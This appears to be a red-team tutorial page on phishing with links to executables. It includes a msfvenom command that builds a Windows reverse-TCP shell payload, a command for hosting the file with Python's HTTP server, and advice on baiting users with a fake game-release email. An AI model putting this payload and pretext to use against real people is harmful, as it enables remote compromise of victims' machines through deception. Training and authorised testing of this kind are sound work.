# Links: Binaries

Although the use of binaries has decreased, it remains a prime example of how users may inadvertently download executable files, potentially granting access to attackers. It's crucial to remember that the weakest link in security is often the user themselves.

In this demonstration, I will showcase a chat email containing a link to download an executable file, enabling evasion of email security measures designed to scan binaries. This method will prompt the user to download or execute the binary.

Utilizing msfvenom simplifies this process of creating payloads and is well-known within the security industry. It offers versatility, allowing users to incorporate various packaging, obfuscation, and stripping techniques to enhance the payload's stealth. While this technique can be perceived as an attachment, I will embed the link within a PDF file attached to the email, with the primary attack vector still being a link.

To create a binary payload using msfvenom, I will execute the following command:

`msfvenom --platform windows --arch x64 --payload windows/x64/shell/reverse_tcp LHOST= LPORT= --format exe --out payload.exe`

The resulting payload can be hosted on a web server, and the link can be shared within a phishing email. Consider crafting the email pretext around a fictional new game release to entice the user to click on the link.

<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

(Don't worry, my curiosity would have gotten the best of me also as I would've clicked it as well).

Upon clicking the link, the user will be prompted to download the payload. Once downloaded, running the payload would be sufficient for the intended attack to take place.

<figure><img src="../../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

(Great game by the way).

In the example provided, I hosted the payload using the Python simple HTTP server. To initiate this process, you can use the following command:

`python3 -m http.server`

After successfully persuading the user to execute the payload, we will receive a shell back to our machine. This technique, while straightforward, is highly effective in obtaining a shell and is not commonly encountered nowadays; however, it has proven to be a successful and efficient method in the past.

<figure><img src="../../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

By incorporating a link in our email, we entice the user to download the binary and execute it, allowing us to gain execution of the payload.

<br>

<br>

